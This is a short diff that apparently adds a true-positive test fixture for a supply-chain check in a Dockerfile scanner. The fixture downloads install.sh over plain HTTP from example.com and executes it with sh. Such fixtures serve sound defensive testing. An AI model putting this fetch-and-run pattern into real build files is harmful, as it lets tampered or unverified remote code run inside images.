@@ -1,0 +1,4 @@
+# TP — ADD from remote URL over HTTP (supply_chain)
+FROM alpine:3.19
+ADD http://example.com/install.sh /tmp/install.sh
+RUN sh /tmp/install.sh
